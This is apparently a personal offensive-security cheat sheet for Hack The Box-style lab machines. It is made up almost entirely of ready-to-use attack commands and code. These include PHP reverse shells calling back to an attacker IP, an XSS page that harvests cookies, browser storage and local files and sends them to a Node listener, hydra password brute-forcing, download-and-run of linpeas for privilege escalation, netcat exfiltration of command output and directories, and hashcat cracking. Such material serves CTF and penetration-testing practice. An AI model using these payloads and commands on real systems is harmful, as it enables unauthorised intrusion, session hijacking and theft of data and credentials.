## Add host:
```bash
echo "10.100.100.100 box.htb" | sudo tee -a /etc/hosts
```

## Generate ssh key:
```bash
mkdir /home/$USER/.ssh
ssh-keygen -t rsa -b 4096 -f /home/$USER/.ssh/id_rsa -N ""
```

## Copy ssh key:
```bash
ssh-keyscan -H box.htb >> ~/.ssh/known_hosts
ssh-copy-id user@box.htb
```

# Recon
## Network scan with`nmap`:
```bash
nmap -v -sV -O -A --top-ports 1000 -oN nmap_output.txt box.htb
```

## Directory enumeration with `dirb`:
```bash
dirb http://box.htb /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
```

## Subdomains enumeration with `ffuf`:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://box.htb -H "Host: FUZZ.box.htb" -mc 200 -fs 15949 -o ffuf_output.json -of json
```

## Web app scan with `nikto`:
```bash
nikto -h box.htb -p 80 -o nikto_output.txt
```
# Exploit
## Exploit with `metasploit`:
```bash
msfconsole

show

search <exploit_name>

use exploit/linux/http/exploit_name

set RHOSTS box.htb
set RPORT 80

show payloads
set payload <payload_name>

exploit
```

## Reverse Shells
### Listener:
```bash
nc -lvnp 4444
```
### Bash
### PHP (Command)
```bash
php -r '$sock=fsockopen("10.10.10.100",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
```
### PHP (File)
```php
<?php
$ip = '10.10.10.100'; // change this to your IP address
$port = 4444; // change this to your listening port
$socket = fsockopen($ip, $port);
if ($socket) {
    $shell = 'uname -a; w; id; /bin/sh -i';
    fwrite($socket, $shell);
    while (!feof($socket)) {
        $command = fgets($socket);
        $output = '';
        if ($command) {
            $output = shell_exec($command);
            fwrite($socket, $output);
        }
    }
    fclose($socket);
}
?>
```

## XSS/CSRF attack
### Serve:
```bash
mkdir xss
cd xss
nano index.html
sudo python3 -m http.server 4444
```
### index.html:
```bash
<html>
  <head>
    <title>CTF</title>
    <script>
      document.addEventListener('DOMContentLoaded', (event) => {
        (async function() {
          const YOUR_SERVER_IP = "10.10.10.100";
          const targetFile = "/etc/passwd";  // Example file path to try LFI
          
          try {
            // Attempt to load a local file via image or another method
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = `file://${targetFile}`;  // Adjust based on the vulnerability you're exploiting
            document.body.appendChild(iframe);

            // Delay to give time for the iframe to load
            await new Promise(resolve => setTimeout(resolve, 2000));

            // Collect User-Agent
            let userAgent = navigator.userAgent;

            // Collect Cookies
            let cookies = document.cookie;

            // Collect Local Storage Data
            let localStorageData = {};
            for (let i = 0; i < localStorage.length; i++) {
              let key = localStorage.key(i);
              localStorageData[key] = localStorage.getItem(key);
            }

            // Collect Session Storage Data
            let sessionStorageData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
              let key = sessionStorage.key(i);
              sessionStorageData[key] = sessionStorage.getItem(key);
            }

            // Collect Document Properties
            let documentData = {
              title: document.title,
              url: document.URL,
              referrer: document.referrer,
              domain: document.domain
            };

            // Try to grab content from the iframe (if accessible)
            let fileContents = iframe.contentDocument ? iframe.contentDocument.body.innerText : "File access failed";

            // Create a final object to hold all the data
            let data = {
              userAgent: userAgent,
              cookies: cookies,
              localStorage: localStorageData,
              sessionStorage: sessionStorageData,
              document: documentData,
              fileContents: fileContents
            };

            // Send the data to your server
            let img = new Image();
            img.src = `http://${YOUR_SERVER_IP}:5555/?allData=` + encodeURIComponent(JSON.stringify(data));

            // Clean up the iframe
            document.body.removeChild(iframe);

          } catch (error) {
            let img = new Image();
            img.src = `http://${YOUR_SERVER_IP}:5555/?error=` + encodeURIComponent(error);
          }
        })();
      });
    </script>
  </head>
  <body>
    <h1>Hi Admin!</h1>
  </body>
</html>
```
### Listen:
```bash
mkdir cookies
cd cookies
nano index.js
node index.js
```
### index.js:
```bash
const http = require('http');
const url = require('url');

// Create a server to receive the data
http.createServer((req, res) => {
  // Parse the incoming request's query parameters
  const queryObject = url.parse(req.url, true).query;

  // Check if there's an 'allData' parameter
  if (queryObject.allData) {
    // Parse the received data
    const receivedData = JSON.parse(decodeURIComponent(queryObject.allData));

    // Display the received data in a readable format
    console.log('--- Received Data from Admin ---\n');
    
    // Display User Agent
    console.log('User-Agent: ', receivedData.userAgent, '\n');

    // Display Cookies
    console.log('Cookies: ', receivedData.cookies || 'No cookies found', '\n');

    // Display Local Storage
    console.log('Local Storage:');
    console.table(receivedData.localStorage);

    // Display Session Storage
    console.log('\nSession Storage:');
    console.table(receivedData.sessionStorage);

    // Display Document Data
    console.log('\nDocument Data:');
    console.table(receivedData.document);

    // Display Remote File Content
    console.log('\Remote File Content:');
    console.table(receivedData.fileContents);   

  } else if (queryObject.error) {
    // Log any errors that were encountered
    console.error('Error: ', decodeURIComponent(queryObject.error));
  } else {
    console.log('Unknown Data Received:', queryObject);
  }

  // Send a response back to acknowledge receipt
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Data received and logged');
}).listen(5555, () => {
  console.log('Server listening on port 5555');
});
```

## Login brute-force with `hydra`
### Syntax 1:
```bash
sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://box.htb/login"&username=^USER^&password=^PASS^:F=Bad"
```
### Syntax 2:
```bash
sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt box.htb http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
```

# Privilege escalation
## Privilege escalation with `linpeas`
### Serve:
```bash
mkdir linpeas
cd linpeas
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
### Download and execute:
```bash
cd /tmp
wget 10.10.10.100:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -q -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex -e
```

# Extraction
## Send command output with `netcat`
```bash
whoami | nc 10.10.10.100 4444
```

## Send directory with `netcat`
### Receiver:
```bash
nc -lvp 4444 > directory.tar.gz
```
### Sender:
```bash
tar -czf directory.tar.gz ./directory
cat directory.tar.gz | nc 10.10.10.100 4444
```

## Archive manipulation with `tar`
### Compress:
```bash
tar -czvf archive.tar.gz /path/to/directory_or_file
```
### Extract:
```bash
tar -xzvf archive.tar.gz -C /path/to/extract
```

## Python proxy
```bash
import http.server
import socketserver
import requests

# Configuration
PUBLIC_HOST = "0.0.0.0"  # Listen on all interfaces
PUBLIC_PORT = 4444        # Public-facing port (the one you want external users to access)
TARGET_URL = "http://127.0.0.1:8080"  # Local service URL to be proxied

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def _forward_request(self, method):
        # Construct the target URL by appending the requested path
        target_url = f"{TARGET_URL}{self.path}"

        # Read request headers and body
        headers = {key: self.headers[key] for key in self.headers}
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length else None

        # Forward the request based on the method type
        if method == 'GET':
            response = requests.get(target_url, headers=headers, allow_redirects=False)
        elif method == 'POST':
            response = requests.post(target_url, headers=headers, data=body, allow_redirects=False)
        else:
            # Add more methods as needed (PUT, DELETE, etc.)
            response = requests.request(method, target_url, headers=headers, data=body, allow_redirects=False)

        # Send the response back to the client
        self.send_response(response.status_code)
        for key, value in response.headers.items():
            # Prevent the transfer-encoding header from being set to chunked
            if key.lower() != 'transfer-encoding':
                self.send_header(key, value)
        self.end_headers()
        self.wfile.write(response.content)

    def do_GET(self):
        self._forward_request('GET')

    def do_POST(self):
        self._forward_request('POST')

# Create an HTTP server and bind it to a public-facing IP address
with socketserver.TCPServer((PUBLIC_HOST, PUBLIC_PORT), ProxyHandler) as httpd:
    print(f"Serving on {PUBLIC_HOST}:{PUBLIC_PORT}, proxying to {TARGET_URL}")
    httpd.serve_forever()
```

## Crack hash with hashcat
### Extract rockyou.txt (ParrotOS):
```bash
cd /usr/share/wordlists
sudo gunzip rockyou.txt.gz
```
### Crack hash:
```bash
mkdir hash
cd hash
nano hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
